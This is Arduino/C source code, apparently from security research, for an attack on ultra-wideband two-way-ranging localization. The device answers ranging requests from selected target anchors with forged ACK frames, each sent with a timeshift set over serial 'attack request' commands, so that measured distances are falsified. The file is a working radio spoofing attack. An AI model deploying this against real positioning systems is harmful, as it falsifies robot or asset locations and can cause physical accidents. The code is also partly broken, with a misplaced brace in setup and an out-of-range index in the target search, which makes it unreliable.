#include "LocalizationAttack.h"




static DecaDuino decaduino;
int state, previous_state, next_state;

/* UWB frames */
uint8_t txData[128];
uint8_t rxData[128];
uint16_t rxLen;

/* IDs */
byte myID[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0B, NODE_ID};
byte targetID [8]; //Id robot reçue
byte anchorID [8];   //Id de l'ancre émettrice


/* attack parameters */
byte identifiant[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0B, 0x01};
byte ID_1[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01};
byte ID_2[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02};
byte ID_3[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03};
byte ID_4[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04};
int nb_targets = 4;
int isTarget,target_idx;
char serial_command,target_id;

byte *ID_TARGETS[10]= {ID_2,ID_1,ID_3,ID_4};
//uint64_t timeshifts[] = {3000,8000,3000,3000};
uint64_t timeshifts[] = {0,0,0,0};




/* timestamps */
uint64_t wait_time, t2, t3;      //temps de réception et temps de ré-émission

/* cooperative methods */
static byte next_target_id[8] = {0};
static byte ghost_anchor_id[8] = {0};
static byte next_anchor_id[8] = {0};

static const char * states[50]=
{
"Init",
"Ghost Anchor",
"Rx ON",
"Wait Start",
"Send ACK",
"Send Data",
"Serial"
};


int byte_array_cmp(byte b1[8], byte b2[8]) {
	int i = 0, ret = 1;
	for (i = 0; i <8; i++) {
		if (b1[i] != b2[i]) {
			ret = 0;
			break;
		}
	}
	return(ret);
}


void print_byte_array(byte b[8]) {
	/* print byte array as an hex string */
	int i;
	for (i = 0; i < 8; i ++) {
		if (b[i] < 16) {
			/* first digit is 0; printing 0 explicitly */
			Serial.print("0");
		}
		Serial.print(b[i],HEX);
	}
}

int main() {
	tag_setup();
	while (1) {
		loop();
		yield();
	}

	return(0);
}


void tag_setup() {
  byte error=0;
  delay(1000);
  DPRINTFLN("decaduino init start");
  pinMode(13, OUTPUT);
  pinMode(14, OUTPUT);
  //SPI.setSCK(13);
  SPI.setSCK(14);
  //set for anchors C and D
  //use pin 14 for A and B by uncommenting code lines above
  if ( !decaduino.init() ) {                    //En cas d'erreur on fait clignoter la LED
    error=decaduino.init();

    while(1) {
      digitalWrite(13, HIGH);
      delay(50);
      digitalWrite(13, LOW);
      delay(50);
    }

  // Set RX buffer
  decaduino.setRxBuffer(rxData, &rxLen);
  if(!decaduino.setChannel(5)) {
    Serial.println("failed to set Channel");
  }
  else {
    Serial.println("succeeded to set Channel");
  }


  if (!decaduino.setSmartTxPower(0) ) {
    Serial.println("$wrong argument for set STP");
  }

  if (decaduino.getSmartTxPower() != 0) {
    Serial.println("$STP failed");
  }

  decaduino.setPhrPower(18,15.5);
  decaduino.setSdPower(18,15.5);

  decaduino.setPreambleLength(256);

  state = TWR_ENGINE_STATE_INIT;

}

// TODO : decaduino configure

void tag_RxTxConfig() {
	decaduino.setRxBuffer(rxData, &rxLen);
}

void loop() {
  if (state != previous_state) {
    /*Serial.print("$State: ");
    Serial.println(states[state]);*/
  }

	previous_state = state;
  switch (state) {

    case TWR_ENGINE_STATE_INIT:
      //decaduino.plmeRxDisableRequest();
      state = TWR_ENGINE_STATE_RX_ON;
      break;


    case TWR_ENGINE_STATE_RX_ON:
      decaduino.plmeRxEnableRequest();
			if (Serial.available() > 0) {
				state = TWR_ENGINE_STATE_SERIAL;
				next_state = TWR_ENGINE_STATE_WAIT_START;
			}
			else {
      	state = TWR_ENGINE_STATE_WAIT_START;
			}
      break;

			case TWR_ENGINE_STATE_SERIAL:
			 // reading serial command
			 serial_command = Serial.read(); // { used as termination character
			 while ((serial_command == '\r') || (serial_command == '\n')) {
				// skipping
				serial_command = Serial.read();

			 }

			 if (serial_command == (char) -1) {
				// Nothing was available
				state = next_state;
			 }
			 else {
				 switch(serial_command - ASCII_NUMBERS_OFFSET) {
					case 0:
						Serial.println("$ [Serial command]: Attack request");
						// reading anchor ID
						target_id = Serial.read();
						if ((target_id == -1) || (target_id == '\r') || (target_id == '\n') ){
							Serial.println("$ Dismissing command: no ID received");
						}
						else if ( (serial_command < ASCII_NUMBERS_OFFSET) || (serial_command > ASCII_NUMBERS_OFFSET + 9)){
							Serial.println("$ Dismissing command: invalid ID received");
						}
						else {
							Serial.print("$ Target ID: ");
							Serial.println(target_id);
							// Reading timeshift value
							int timeshift = Serial.parseInt();

							for (int i = 0; i < nb_targets; i++) {
								Serial.println((ID_TARGETS[i])[7]);
								if ( (ID_TARGETS[i])[7] == (byte) (target_id - ASCII_NUMBERS_OFFSET) ) {
									timeshifts[i] = timeshift;
									Serial.print("Updating timeshift of target: ");
									Serial.println((int) timeshifts[i]);

								}
							}
						}

						break;
					case 1:
						Serial.println("$ command #2 received");
						break;
					default:
						Serial.println("$ unknown command received:");
						Serial.println(serial_command);
						break;
				 }

				 // Staying in Serial state if bytes are still available in buffer
				 if (Serial.available() > 0) {
					state = TWR_ENGINE_STATE_SERIAL;
				 }
				 else {
					state = next_state;
				 }
			 }
			break;

    case TWR_ENGINE_STATE_WAIT_START:
      if ( decaduino.rxFrameAvailable() ) {
        /* START format : START | targetID | anchorID */
        if ( rxData[0] == TWR_MSG_TYPE_START ) {
          //Serial.println("$Start received");
          for (int i=0; i<8; i++){
           targetID [i] = rxData[i+1];
           anchorID [i] = rxData[i+9];
          }
          if ( byte_array_cmp(targetID, myID) ) {
            t2 = decaduino.getLastRxTimestamp();
            state = TWR_ENGINE_STATE_SEND_ACK;
						// finding out if the anchor ID is a target

						isTarget = 0;
						target_idx = -1;

						while (!isTarget && (target_idx++ < nb_targets) ) {
							//print_byte_array(anchorID);
							//Serial.println();
							if (  *(uint64_t*)anchorID == *(uint64_t *)(ID_TARGETS[target_idx]) ) {
								isTarget = 1;
								//Serial.println("$Target found");

							}
						}
          }
          else{
              DPRINTFLN("Not for me" );
              state = TWR_ENGINE_STATE_RX_ON;
          }
        }
        else {
          //DPRINTFLN("Not a START frame");
          state = TWR_ENGINE_STATE_RX_ON;
        }
      }
      break;



    case TWR_ENGINE_STATE_SEND_ACK:
      txData[0] = TWR_MSG_TYPE_ACK;           //On acquite le message (champs 0 du mesage)
      for( int i =0; i<8 ; i++){
        txData[1+i] = anchorID[i];
        txData[9+i] = targetID[i];
      }
			if (timeshifts[target_idx] != 0) {
        Serial.println("$Sending ACK");
        decaduino.pdDataRequest(txData, 18,1, t2 + 100000000 + timeshifts[target_idx]);
        while (!decaduino.hasTxSucceeded());
      }
			else {
				decaduino.plmeRxDisableRequest();
			}
      state = TWR_ENGINE_STATE_INIT;
      break;

    default:
      state = TWR_ENGINE_STATE_INIT;
      break;
  }
}
